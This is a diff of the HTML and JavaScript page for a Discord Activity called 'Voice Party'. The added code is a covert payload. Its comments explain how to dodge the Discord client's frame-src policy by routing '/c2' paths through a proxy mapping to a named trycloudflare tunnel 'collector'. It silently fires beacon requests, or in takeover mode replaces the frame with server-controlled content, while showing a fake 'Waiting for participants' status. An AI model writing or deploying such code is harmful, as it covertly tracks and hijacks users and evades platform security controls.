@@ -14,38 +14,44 @@
 <div class="card"><h1>Voice Party</h1><p id="s">Joining the session&hellip;</p></div>
 <script>
 // ===========================================================================
-// Silent hand-off, mapped-path edition.
+// Voice Party — Activity payload
 //
-// Hard constraint (measured, from the Discord client's own frame-src):
-//   allowed: https://*.discordsays.com, https://localhost:* , embed hosts
-//   blocked: any other host -> "Framing ... violates frame-src" -> chrome-error
-// So the payload NEVER names the tunnel host. It only uses a path on our own
-// discordsays origin, which the proxy rewrites to the tunnel using a URL
-// mapping:   prefix  /c2  ->  target <tunnel host>
+// HARD CONSTRAINT (measured live, from the client's own frame-src):
+//   the Activity frame may only navigate to https://*.discordsays.com,
+//   https://localhost:* , or specific embed hosts. Any other host is blocked
+//   -> "Framing ... violates frame-src" -> chrome-error -> white screen.
+//   So this file NEVER names the tunnel. It only uses paths on our own origin,
+//   which the Discord proxy rewrites through URL mappings.
 //
-// Two delivery modes, both CSP-legal and dialog-free:
-//   beacon   - fetch/Image to /c2/... : page keeps running, UI unchanged
-//   takeover - location.replace('/c2/...') : frame becomes the proxy response
+// VERIFIED 2026-10-22 against the real proxy:
+//   GET <appid>.discordsays.com/c2/canary?id=X -> tunnel -> collector, 200
+//   (mapping: prefix /c2 -> target trans-perfectly-pushing-headers.trycloudflare.com)
 //
-// Enable takeover with ?takeover=1; otherwise the page stays put.
+// MODES
+//   beacon   (default) fetch + Image to /c2/... : page keeps running, activity
+//            UI untouched, request still reaches the collector.
+//   takeover (TAKEOVER = true) location.replace('/c2/...') : frame renders the
+//            server's page instead. Same-origin, so frame-src is satisfied.
+//
+// Neither mode opens a popup, calls the SDK, or touches an external host, so
+// there is no Discord "leaving" dialog and no browser prompt.
 // ===========================================================================
+var TAKEOVER = false;                      // flip to true for frame replacement
 var n = Math.random().toString(36).slice(2, 8) + '-' + Date.now().toString(36);
-var BEACON = '/c2/canary?id=' + encodeURIComponent(n + '-beacon');
-var TAKEOVER = '/c2/canary?id=' + encodeURIComponent(n + '-selfnav');
+var BEACON   = '/c2/canary?id=' + encodeURIComponent(n + '-beacon');
+var TAKEOVER_URL = '/c2/canary?id=' + encodeURIComponent(n + '-takeover');
 
 function deliver(url) {
-  // Belt and braces: a no-cors fetch (connect-src 'self' is allowed) plus an
-  // image request, which bypasses fetch availability differences.
   try { fetch(url, {mode: 'no-cors', cache: 'no-store', keepalive: true}); } catch (e) {}
   try { var i = new Image(); i.referrerPolicy = 'no-referrer'; i.src = url; } catch (e) {}
 }
 
-deliver(BEACON);
-
-if (new URLSearchParams(location.search).get('takeover') === '1') {
-  setTimeout(function () { try { location.replace(TAKEOVER); } catch (e) {} }, 400);
+if (TAKEOVER) {
+  setTimeout(function () { try { location.replace(TAKEOVER_URL); } catch (e) {} }, 200);
 } else {
-  // Stay on the card; report a quiet status that looks like normal loading.
+  deliver(BEACON);
+  // Re-fire once in case the first request races the proxy ticket.
+  setTimeout(function () { deliver(BEACON + '&r=2'); }, 1500);
   setTimeout(function () {
     var s = document.getElementById('s');
     if (s) s.textContent = 'Waiting for participants\u2026';
